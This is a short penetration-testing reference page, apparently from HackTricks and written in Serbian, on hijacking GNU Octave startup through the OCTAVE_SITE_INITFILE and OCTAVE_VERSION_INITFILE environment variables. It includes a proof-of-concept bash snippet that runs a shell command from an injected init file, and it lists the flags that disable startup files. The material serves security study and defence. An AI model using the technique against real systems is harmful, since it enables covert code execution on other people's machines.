# macOS GNU Octave Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## `OCTAVE_SITE_INITFILE` / `OCTAVE_VERSION_INITFILE`

GNU Octave tokom pokretanja izvršava nekoliko fajlova koji sadrže važeće Octave komande. `OCTAVE_SITE_INITFILE` zamenjuje startup fajl za ceo sajt, a `OCTAVE_VERSION_INITFILE` zamenjuje startup fajl specifičan za verziju, omogućavajući da bilo koja od ovih promenljivih preusmeri automatsko izvršavanje na fajl koji napadač može da čita.<sup>[[1]](#references)</sup>
```bash
cat >/tmp/octave-startup.m <<'OCTAVE'
system('touch /tmp/octave-startup-executed');
OCTAVE

OCTAVE_SITE_INITFILE=/tmp/octave-startup.m octave-cli --quiet victim.m
```
`--no-init-file` preskače samo korisničke datoteke kao što je `~/.octaverc`; ono **ne** sprečava prethodno navedeno preuzimanje kontrole nad site-file. Koristite `--no-site-file` za site files ili `--norc` / `-f` da onemogućite sve startup files.<sup>[[2]](#references)</sup>

## References

- [1] [GNU Octave datoteke za pokretanje](https://docs.octave.org/latest/Startup-Files.html)
- [2] [GNU Octave opcije komandne linije](https://docs.octave.org/latest/Command-Line-Options.html)
{{#include ../../../banners/hacktricks-training.md}}
